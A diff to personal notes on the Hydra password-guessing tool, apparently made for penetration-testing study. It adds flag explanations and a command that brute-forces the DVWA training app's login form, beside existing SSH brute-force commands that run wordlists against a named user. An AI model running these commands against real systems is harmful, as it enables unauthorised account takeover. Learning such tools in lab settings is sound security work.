@@ -5,9 +5,18 @@
 :: Params ::
 
 -t # = preform # tasks
--l NAME = try to log in with NAME
--P [filepath] = Try password
--vV = verbose mode, showing the login+pass for each attempt
+-l indicates a single username (use -L for a username list). NAME = try to log in with NAME
+-P indicates use the following password list. [filepath] = Try password
+- http-post-form indicates the type of form
+/dvwa/login-php is the login page URL
+
+- username is the form field where the username is entered
+^USER^ tells Hydra to use the username or list in the field
+password is the form field where the password is entered (it may be passwd, pass, etc.)
+^PASS^ tells Hydra to use the password list supplied
+Login indicates to Hydra the login failed message
+Login failed is the login failure message that the form returned
+-V is for verbose output showing every attempt
 
 #check for joe accounts by adding modifier -e s
 
@@ -24,4 +33,8 @@
 - hydra -l ksanchez -e nsr [IP] ssh -V -f
 - hydra -l ksanchez -P /root/wordlist/rockyour.lst 10.0.0.10 ssh
 - hydra -L dict.txt -P wordlist.lst [IP] ssh
+- hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -w 10 -V
 
+
+
+http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/
